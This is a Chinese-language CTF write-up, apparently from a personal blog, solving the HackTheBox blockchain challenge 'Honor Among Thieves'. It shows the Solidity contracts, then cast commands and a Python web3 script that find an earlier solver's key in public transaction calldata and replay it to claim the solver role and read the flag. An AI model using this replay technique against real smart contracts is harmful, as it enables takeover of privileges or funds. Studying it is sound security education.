{
  "id": 1760067356545,
  "title": "HackTheBox Honor Among Thieves",
  "slug": "htb-honor-among-thieves",
  "date": "2025-03-04",
  "isEncrypted": false,
  "html": "<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737633787055-8cc0e902-e8df-4b14-aa28-f9fdbc8e5e5d.png\" alt=\"\"></p>\n<p>查看给到的两个附件</p>\n<p>Rivals.sol</p>\n<pre><code class=\"language-shell\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\ncontract Rivals {\n    event Voice(uint256 indexed severity);\n\n    bytes32 private encryptedFlag;\n    bytes32 private hashedFlag;\n    address public solver;\n\n    constructor(bytes32 _encrypted, bytes32 _hashed) {\n        encryptedFlag = _encrypted;\n        hashedFlag = _hashed;\n    }\n\n    function talk(bytes32 _key) external {\n        bytes32 _flag = _key ^ encryptedFlag;\n        if (keccak256(abi.encode(_flag)) == hashedFlag) {\n            solver = msg.sender;\n            emit Voice(5);\n        } else {\n            emit Voice(block.timestamp % 5);\n        }\n    }\n}\n</code></pre>\n<p>定义了事件 Voice、bytes32变量 encryptedFlag、hashedFlag、地址变量 solver、函数talk()</p>\n<p> Voice 记录了每次调用 talk()的结果，其中indexed 关键字允许我们通过在链上通过值来查询状态</p>\n<p>然后构造函数在合约部署的时候接受_encrypted、_hashed 赋值给encryptedFlag、hashedFlag</p>\n<p>调用 talk()函数时传入的 _key 将异或encryptedFlag，然后算出的 hash 值如果等于hashedFlag，就将solver 设置为 msg.sender，并且将事件值记录为 5</p>\n<p>setup.sol</p>\n<pre><code class=\"language-shell\">// SPDX-License-Identifier: UNLICENSED\npragma solidity ^0.8.13;\n\nimport {Rivals} from &quot;./Rivals.sol&quot;;\n\ncontract Setup {\n    Rivals public immutable TARGET;\n\n    constructor(bytes32 _encryptedFlag, bytes32 _hashed) payable {\n        TARGET = new Rivals(_encryptedFlag, _hashed);\n    }\n\n    function isSolved(address _player) public view returns (bool) {\n        return TARGET.solver() == _player;\n    }\n}\n</code></pre>\n<p>可以知道当 solver 为我们自己的地址的时候，我们就完成挑战</p>\n<p>我们没有任何已知的消息，如果使用暴力破解计算key，那么 byte32，32 个字节，1 字节 8 位，有 2^256 种可能，结合题目，盗贼的荣誉加上indexed 关键字可以查询</p>\n<p>感觉 log 中应该有关键信息</p>\n<pre><code class=\"language-shell\">cast call &lt;target address&gt; &quot;solver()(address)&quot;  --rpc-url &lt;rpc url&gt; --from &lt;address&gt; --private-key &lt;private key&gt; --interactive\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737635475030-7968b957-eb47-47f2-9473-cb83d5b327e6.png\" alt=\"\"></p>\n<p>按照道理来说，初始化之后，solver 我们还没挑战成功，没有值，应该是 0x0，所以这表示这之前有一个地址成功用 key 匹配到了hashedFlag，那么我们只需要查询 log  中的 Voice 事件为 5 的信息即可，就可以偷到他的 key</p>\n<pre><code class=\"language-shell\">cast logs &quot;event Voice(uint256 indexed severity)&quot; --from-block earliest --to-block latest --rpc-url $RPC\n</code></pre>\n<p>但是输出之后我们会发现有很多区块信息，那么我们就需要过滤一下</p>\n<p>写一个脚本</p>\n<pre><code class=\"language-shell\">from web3 import Web3\nimport requests\nimport json\n\nurl = &quot;http://94.237.59.180:43695&quot;\n\ninfo = json.loads(requests.get(url + &quot;/connection_info&quot;).content)\n\nprivkey = info[&quot;PrivateKey&quot;]\ntarget_addr = info[&quot;TargetAddress&quot;]\npub_address = info[&quot;Address&quot;]\n\nw3 = Web3(Web3.HTTPProvider(url + &#39;/rpc&#39;))\n\ndef string_to_bytes32(text):\n    return Web3.to_bytes(text=text).ljust(32, b&#39;\\0&#39;)\n\ncontract = w3.eth.contract(address=target_addr, abi=open(&quot;abi.json&quot;, &quot;r&quot;).read())\n\n# 获取事件签名的 Keccak 哈希值\nevent_signature = Web3.keccak(text=&#39;Voice(uint256)&#39;).hex()\n\n# 使用 web3.eth.filter 创建过滤器\nfilter_params = {\n    &#39;fromBlock&#39;: 0,\n    &#39;address&#39;: target_addr,\n    &#39;topics&#39;: [event_signature]\n}\n\nevent_filter = w3.eth.filter(filter_params)\n\nlogs = event_filter.get_all_entries()\n\ntx_hash = None  # 初始化 tx_hash 变量\n\nfor log in logs:\n    tx_receipt = w3.eth.wait_for_transaction_receipt(log[&#39;transactionHash&#39;].hex())\n    if tx_receipt[&#39;logs&#39;][0][&#39;topics&#39;][1] == b&#39;\\x00&#39;*31 + b&#39;\\x05&#39;:\n        print(&quot;find!!!&quot;)\n        tx_hash = log[&#39;transactionHash&#39;].hex()\n        print(f&quot;Transaction Hash: {tx_hash}&quot;)  # 输出 transaction hash 的值\n        break\n\nif tx_hash is None:\n    print(&quot;No matching transaction found.&quot;)\nelse:\n    key = w3.eth.get_transaction(tx_hash)[&#39;input&#39;].hex()\n    key = bytes.fromhex(key[2:])[4:] # key is including function selector which is 4 bytes\n\n    # 将 key 转换为 bytes32 类型\n    key_bytes32 = w3.to_bytes(hexstr=key.hex().ljust(64, &#39;0&#39;))\n\n    transaction = contract.functions.talk(key_bytes32).build_transaction(\n        {\n            &quot;chainId&quot;: w3.eth.chain_id,\n            &quot;gasPrice&quot;: w3.eth.gas_price,\n            &quot;from&quot;: pub_address,\n            &quot;nonce&quot;: w3.eth.get_transaction_count(pub_address),\n            &quot;value&quot;: 0 \n        }\n    )\n\n    # 签名交易\n    sign_transaction = w3.eth.account.sign_transaction(transaction, private_key=privkey)\n\n    # 发送已签名的交易\n    tx_hash_new = w3.eth.send_raw_transaction(sign_transaction.raw_transaction)\n    tx_receipt_new = w3.eth.wait_for_transaction_receipt(tx_hash_new)\n\n    print(f&quot;New Transaction Hash: {tx_hash_new.hex()}&quot;)  # 输出新交易的 transaction hash\n\nprint(requests.get(url + &#39;/flag&#39;).content.decode())\n</code></pre>\n<p>脚本本意只是获取transactionHash，所以目的算是达成了，后续可以依靠 foundry 自行获取 key 值</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737643293733-ac47723a-0ee3-4f54-b00c-2c523b6f7f13.png\" alt=\"\"></p>\n<p>依靠transactionHash 获取交易详情的 input</p>\n<pre><code class=\"language-shell\">cast tx  &lt;transactionHash&gt; --rpc-url &lt;rpc url&gt;\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737643457175-a423d87e-acef-4154-91d6-9b4c3c5f7b88.png\" alt=\"\"></p>\n<p>这个 input 需要解密获取 key</p>\n<pre><code class=\"language-shell\">cast calldata-decode &quot;talk(bytes32)&quot; 0x52eab0faca49874812ce85f1e1090f791fdc59b21fa71d88e9f74717b24834cffd4f04bf\n</code></pre>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737643488940-68274474-03ec-4029-9c8f-62eb862ea144.png\" alt=\"\"></p>\n<p>依靠偷到的 key 进行交互</p>\n<pre><code class=\"language-shell\">cast send &lt;target address&gt; &quot;talk(bytes32)&quot; &lt;key&gt; --rpc-url &lt;rpc url&gt; --interactive\n</code></pre>\n<p>打开 /flag 就可以</p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737643174950-53a75c62-dc0a-49b9-aac6-c136f9a1a0f7.png\" alt=\"\"></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2025/png/36086461/1737643157112-178b1d0a-9207-4b4c-b80f-547a63f10cec.png\" alt=\"\"></p>\n"
}